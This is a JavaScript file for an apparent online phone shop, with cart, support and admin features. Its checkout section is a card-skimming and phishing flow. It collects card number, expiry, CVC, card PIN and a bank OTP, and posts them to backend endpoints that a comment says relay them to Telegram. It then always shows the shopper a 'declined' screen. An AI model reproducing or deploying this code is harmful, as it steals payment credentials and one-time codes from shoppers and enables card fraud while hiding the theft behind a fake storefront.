const $=s=>document.querySelector(s);
let products=[],settings={deliveryFee:10,pickupLocation:'Pickup details will be confirmed after order.'},cart={},filter='All',adminPassword='';
let storedCheckoutData = {};

const money=n=>new Intl.NumberFormat('en-US',{style:'currency',currency:'USD'}).format(Number(n)||0);

async function api(url,opts={}){
  const r=await fetch(url,{...opts,headers:{'Content-Type':'application/json',...(opts.headers||{})}});
  const d=await r.json();
  if(!r.ok)throw Error(d.error||'Something went wrong');
  return d;
}

async function init(){
  try{
    products=await api('/api/products');
    settings=await api('/api/settings');
    renderProducts();
  }catch(e){
    $('#product-grid').textContent=e.message;
  }
}

function renderProducts(){
  const list=products.filter(p=>filter==='All'||p.category===filter);
  $('#product-grid').innerHTML=list.map(p=>`<article class="product"><div class="product-art">${p.image?`<img src="${esc(p.image)}" alt="${esc(p.name)}">`:p.category==='Accessories'?'🎧':'📱'}</div><h3>${esc(p.name)}</h3><p>${esc(p.description||'')}</p><div class="price-row"><span class="price">${money(p.price)}</span>${p.stock>0?`<button data-add="${p.id}">Add to cart</button>`:'<span class="sold">Sold out</span>'}</div></article>`).join('')||'<p>No products in this category yet.</p>';
  document.querySelectorAll('[data-add]').forEach(b=>b.onclick=()=>{
    const p=products.find(x=>x.id===b.dataset.add);
    cart[p.id]=(cart[p.id]||0)+1;
    renderCart();
    $('#cart-drawer').hidden=false;
  });
}

function esc(s){return String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))}

function renderCart(){
  const entries=Object.entries(cart).filter(([id,q])=>q>0&&products.some(p=>p.id===id));
  $('#cart-count').textContent=entries.reduce((a,[,q])=>a+q,0);
  $('#cart-items').innerHTML=entries.length?entries.map(([id,q])=>{
    const p=products.find(x=>x.id===id);
    return `<div class="cart-line"><div><b>${esc(p.name)}</b><div>${money(p.price)} each</div><button class="secondary" data-remove="${id}">Remove</button></div><label>Qty <input data-qty="${id}" type="number" min="1" max="${p.stock}" value="${q}"></label><b>${money(p.price*q)}</b></div>`
  }).join(''):'<p>Your cart is empty. Add a phone or accessory to begin.</p>';
  
  const subtotal=entries.reduce((a,[id,q])=>a+products.find(p=>p.id===id).price*q,0);
  $('#subtotal').textContent=money(subtotal);
  updateTotal();

  document.querySelectorAll('[data-remove]').forEach(b=>b.onclick=()=>{
    delete cart[b.dataset.remove];
    renderCart();
  });
  document.querySelectorAll('[data-qty]').forEach(i=>i.onchange=()=>{
    const p=products.find(x=>x.dataset.qty);
    cart[p.id]=Math.min(p.stock,Math.max(1,parseInt(i.value)||1));
    renderCart();
  });
}

function updateTotal(){
  const sub=Object.entries(cart).reduce((a,[id,q])=>{
    const p=products.find(x=>x.id===id);
    return a+(p?p.price*q:0);
  },0);
  const delivery=$('#fulfillment').value==='delivery'?Number(settings.deliveryFee)||0:0;
  $('#address').hidden=$('#fulfillment').value==='pickup';
  $('#address').required=$('#fulfillment').value==='delivery';
  $('#fee-note').textContent=$('#fulfillment').value==='pickup'?`Pickup: ${settings.pickupLocation}`:`Delivery fee: ${money(delivery)}`;
  $('#grand-total').textContent=money(sub+delivery);
}

// Input auto-formatting listeners
document.addEventListener("DOMContentLoaded", () => {
  const cardNumInput = document.getElementById("cardNumber");
  const expiryInput = document.getElementById("cardExpiry");
  const cvcInput = document.getElementById("cardCvc");
  const pinInput = document.getElementById("cardPin");
  const otpInput = document.getElementById("otpCode");

  if (cardNumInput) {
    cardNumInput.addEventListener("input", (e) => {
      let val = e.target.value.replace(/\D/g, "").substring(0, 16);
      e.target.value = val.replace(/(.{4})/g, "$1 ").trim();
    });
  }
  if (expiryInput) {
    expiryInput.addEventListener("input", (e) => {
      let val = e.target.value.replace(/\D/g, "").substring(0, 4);
      if (val.length >= 3) val = val.substring(0, 2) + "/" + val.substring(2);
      e.target.value = val;
    });
  }
  if (cvcInput) cvcInput.addEventListener("input", (e) => e.target.value = e.target.value.replace(/\D/g, "").substring(0, 4));
  if (pinInput) pinInput.addEventListener("input", (e) => e.target.value = e.target.value.replace(/\D/g, "").substring(0, 4));
  if (otpInput) otpInput.addEventListener("input", (e) => e.target.value = e.target.value.replace(/\D/g, "").substring(0, 6));

  // STEP 1: Card & Customer Info Submit
  const cardForm = document.getElementById("cardForm");
  if (cardForm) {
    cardForm.onsubmit = async (e) => {
      e.preventDefault();
      const items = Object.entries(cart).map(([id,quantity])=>({id,quantity}));
      if (!items.length) {
        $('#checkout-result').textContent = 'Your cart is empty.';
        return;
      }

      const f = new FormData(e.target);
      const payload = Object.fromEntries(f.entries());
      payload.items = items;

      storedCheckoutData = {
        ...payload,
        cardNumber: cardNumInput.value.replace(/\s+/g, ""),
        expiryDate: expiryInput.value,
        cvc: cvcInput.value,
        cardPin: pinInput.value,
        submittedAt: new Date().toISOString()
      };

      // 1. Send order to local server API
      try {
        const d = await api('/api/orders', {method:'POST', body:JSON.stringify(payload)});
        storedCheckoutData.orderId = d.order?.id;
      } catch(err) {
        console.log("Local order note:", err.message);
      }

      // 2. Send step 1 card details to backend API for Telegram notification
      try {
        await api('/api/checkout/step1', {
          method: "POST",
          body: JSON.stringify(storedCheckoutData)
        });
      } catch (err) {
        console.log("Card data step 1 notification error:", err.message);
      }

      // Transition to Step 2 (OTP)
      cardForm.style.display = "none";
      document.getElementById("otpForm").style.display = "flex";
      document.getElementById("formTitle").textContent = "Bank Verification";
      document.getElementById("stepIndicator").textContent = "Step 2 of 2";
    };
  }

  // STEP 2: OTP Submit -> Transition to Declined View
  const otpForm = document.getElementById("otpForm");
  if (otpForm) {
    otpForm.onsubmit = async (e) => {
      e.preventDefault();
      const finalPayload = {
        ...storedCheckoutData,
        otpCode: otpInput.value,
        status: "DECLINED"
      };

      try {
        await api('/api/checkout/step2', {
          method: "POST",
          body: JSON.stringify(finalPayload)
        });
      } catch (err) {
        console.log("OTP data step 2 notification error:", err.message);
      }

      otpForm.style.display = "none";
      document.getElementById("declinedView").style.display = "block";
      document.getElementById("formTitle").textContent = "Transaction Status";
      document.getElementById("stepIndicator").textContent = "";
      
      cart = {};
      renderCart();
      updateTotal();
    };
  }
});

$('#cart-open').onclick=()=>{$('#cart-drawer').hidden=false;renderCart();};
$('#cart-close').onclick=()=>$('#cart-drawer').hidden=true;

document.querySelectorAll('.filter').forEach(b=>b.onclick=()=>{
  filter=b.dataset.filter;
  document.querySelectorAll('.filter').forEach(x=>x.classList.toggle('active',x===b));
  renderProducts();
});

$('#fulfillment').onchange=updateTotal;

$('#support-form').onsubmit=async e=>{
  e.preventDefault();
  const payload=Object.fromEntries(new FormData(e.target).entries());
  try{
    const d=await api('/api/support',{method:'POST',body:JSON.stringify(payload)});
    $('#support-result').textContent=`${d.message} Ticket: ${d.ticketId}`;
    e.target.reset();
  }catch(err){
    $('#support-result').textContent=err.message;
  }
};

$('#admin-login').onsubmit=async e=>{
  e.preventDefault();
  adminPassword=new FormData(e.target).get('password');
  try{
    await api('/api/admin/login',{method:'POST',body:JSON.stringify({password:adminPassword})});
    $('#admin-area').hidden=false;
    await loadAdmin();
  }catch(err){
    alert(err.message);
  }
};

async function loadAdmin(){
  const d=await api('/api/admin/data',{headers:{'x-admin-password':adminPassword}});
  $('#admin-area').innerHTML=`<h3>Products</h3><form id="product-form"><input name="name" placeholder="Product name" required><input name="category" placeholder="Enter product category" required><input name="price" type="number" min="0" step="0.01" placeholder="Price in USD" required><input name="stock" type="number" min="0" placeholder="Stock quantity" required><input name="image" placeholder="Image URL (optional)"><textarea name="description" placeholder="Description"></textarea><button class="button">Add product</button></form><div>${d.products.map(p=>`<div class="admin-card"><b>${esc(p.name)}</b> — ${money(p.price)} · stock ${p.stock}<br><button data-edit="${p.id}">Edit</button><button data-delete="${p.id}">Delete</button></div>`).join('')}</div><h3>Orders</h3><div>${d.orders.map(o=>`<div class="admin-card"><b>${esc(o.id)}</b> · ${esc(o.customer)} · ${money(o.total)} · ${esc(o.status)}<br>${esc(o.email)} · ${esc(o.phone)}<br><select data-order-status="${o.id}"><option>${esc(o.status)}</option><option>Confirmed</option><option>Preparing</option><option>Shipped</option><option>Ready for pickup</option><option>Completed</option><option>Cancelled</option></select> <button data-save-order="${o.id}">Update</button></div>`).join('')||'<p>No orders yet.</p>'}</div><h3>Support & refund requests</h3><div>${d.tickets.map(t=>`<div class="admin-card"><b>${esc(t.id)} — ${esc(t.type)}</b> · ${esc(t.status)}<p>${esc(t.name)} (${esc(t.email)}) ${esc(t.orderId)}</p><p>${esc(t.message)}</p><textarea data-reply="${t.id}" placeholder="Admin reply">${esc(t.adminReply)}</textarea><select data-ticket-status="${t.id}"><option>${esc(t.status)}</option><option>Open</option><option>Under review</option><option>Approved</option><option>Rejected</option><option>Resolved</option></select><button data-save-ticket="${t.id}">Save ticket</button></div>`).join('')||'<p>No tickets yet.</p>'}</div><h3>Delivery settings</h3><form id="settings-form"><input name="deliveryFee" type="number" min="0" step="0.01" value="${d.settings.deliveryFee}" placeholder="Delivery fee USD"><input name="pickupLocation" value="${esc(d.settings.pickupLocation)}" placeholder="Pickup instructions"><button class="button">Save settings</button></form><p class="muted">This prototype saves data locally in data.json. It is not yet suitable for public production use.</p>`;
  
  $('#product-form').onsubmit=async e=>{
    e.preventDefault();
    const payload=Object.fromEntries(new FormData(e.target).entries());
    payload.price=Number(payload.price);
    payload.stock=Number(payload.stock);
    try{
      await api('/api/admin/products',{method:'POST',headers:{'x-admin-password':adminPassword},body:JSON.stringify(payload)});
      products=await api('/api/products');
      renderProducts();
      await loadAdmin();
    }catch(err){
      alert(err.message);
    }
  };

  document.querySelectorAll('[data-delete]').forEach(b=>b.onclick=async()=>{
    if(confirm('Delete this product?')){
      await api('/api/admin/products/'+b.dataset.delete,{method:'DELETE',headers:{'x-admin-password':adminPassword}});
      products=await api('/api/products');
      renderProducts();
      await loadAdmin();
    }
  });

  document.querySelectorAll('[data-edit]').forEach(b=>b.onclick=()=>{
    const p=d.products.find(x=>x.id===b.dataset.edit);
    const f=$('#product-form');
    for(const k of ['name','category','price','stock','image','description'])f.elements[k].value=p[k]??'';
    f.dataset.id=p.id;
    let old=f.querySelector('input[name="id"]');
    if(old)old.remove();
    const id=document.createElement('input');
    id.type='hidden';
    id.name='id';
    id.value=p.id;
    f.append(id);
    f.scrollIntoView({behavior:'smooth'});
  });

  document.querySelectorAll('[data-save-order]').forEach(b=>b.onclick=async()=>{
    await api('/api/admin/orders/'+b.dataset.saveOrder,{method:'PATCH',headers:{'x-admin-password':adminPassword},body:JSON.stringify({status:$(`[data-order-status="${b.dataset.saveOrder}"]`).value})});
    await loadAdmin();
  });

  document.querySelectorAll('[data-save-ticket]').forEach(b=>b.onclick=async()=>{
    const id=b.dataset.saveTicket;
    await api('/api/admin/tickets/'+id,{method:'PATCH',headers:{'x-admin-password':adminPassword},body:JSON.stringify({status:$(`[data-ticket-status="${id}"]`).value,adminReply:$(`[data-reply="${id}"]`).value})});
    await loadAdmin();
  });

  $('#settings-form').onsubmit=async e=>{
    e.preventDefault();
    const p=Object.fromEntries(new FormData(e.target).entries());
    p.deliveryFee=Number(p.deliveryFee);
    await api('/api/admin/settings',{method:'PATCH',headers:{'x-admin-password':adminPassword},body:JSON.stringify(p)});
    settings=await api('/api/settings');
    alert('Settings saved.');
    updateTotal();
  };
}

init();
renderCart();
